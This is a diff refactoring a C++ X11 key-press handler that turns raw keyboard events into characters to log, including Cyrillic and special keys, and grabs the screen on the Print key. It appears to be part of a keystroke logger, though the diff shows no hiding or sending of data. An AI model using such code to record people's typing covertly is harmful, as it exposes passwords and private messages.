@@ -3,14 +3,17 @@
 #include "../specialKeysHelper/specialKeysHelper.hpp" 
 #include <cstring> 
 
-KeyPressResult process_key_press(Display* display, XIRawEvent* rawev, const XkbStateRec& state, bool& ctrlPressed) {
+KeyPressResult processKeyPress(Display* display, XIRawEvent* rawev, bool& ctrlPressed) {
     KeyPressResult result;
+    XkbStateRec state;
+    XkbGetState(display, XkbUseCoreKbd, &state);
 
     bool is_shift_pressed = (state.mods & ShiftMask);
     bool is_caps_lock_on  = (state.mods & LockMask);
     int level = is_shift_pressed ^ is_caps_lock_on;
 
     KeySym keysym = XkbKeycodeToKeysym(display, rawev->detail, state.group, level);
+
     if (keysym == NoSymbol) {
         keysym = XkbKeycodeToKeysym(display, rawev->detail, 0, level);
     }
@@ -25,41 +28,48 @@ KeyPressResult process_key_press(Display* display, XIRawEvent* rawev, const XkbS
         return result;
     }
 
-    if (keysym == XK_Print) {
-        result.should_grabScreen = true;
-        return result;
-    }
-
-    if (keysym == XK_Escape) {
-        result.should_exit = true;
-        result.printable_name = "Escape";
-        return result;
-    }
-
-    std::string special_char = handleSpecialKeys(keysym);
-    if (!special_char.empty()) {
-        result.char_to_log = special_char;
-        result.printable_name = result.char_to_log.c_str(); 
-        ctrlPressed = false;
-        if (keysym == XK_Control_L) {
+    switch (keysym) {
+        case XK_Control_L:
             ctrlPressed = true;
-        } 
-    } else {
-        ctrlPressed = false;
-        const char* cyrillic_char = keysym_to_utf8_cyrillic(keysym);
-        if (cyrillic_char) {
-            result.char_to_log = cyrillic_char;
-            result.printable_name = cyrillic_char;
-        } else {
-            
+            result.char_to_log = XKeysymToString(keysym);
+            result.printable_name = result.char_to_log.c_str(); 
+            return result; 
 
-            const char* key_name = XKeysymToString(keysym);
-            result.printable_name = key_name;
+        case XK_Print:
+            result.should_grabScreen = true;
+            return result;
 
-            if (key_name && strlen(key_name) == 1) {
-                result.char_to_log = key_name;
+        case XK_Escape:
+            result.should_exit = true;
+            result.printable_name = "Escape";
+            return result;
+        
+        default:
+        {
+            ctrlPressed = false;
+
+            std::string special_char = handleSpecialKeys(keysym);
+            if (!special_char.empty()) {
+                result.char_to_log = special_char;
+                result.printable_name = result.char_to_log.c_str(); 
+            } else {
+                const char* cyrillic_char = keysymToUtf8Cyrillic(keysym);
+                if (cyrillic_char) {
+                    result.char_to_log = cyrillic_char;
+                    result.printable_name = cyrillic_char;
+                } else {
+                    const char* key_name = XKeysymToString(keysym);
+                    if (key_name) {
+                        result.printable_name = key_name;
+                        if (strlen(key_name) == 1) {
+                            result.char_to_log = key_name;
+                        }
+                    }
+                }
             }
+            break; 
         }
     }
-    return result;
+
+return result;
 }
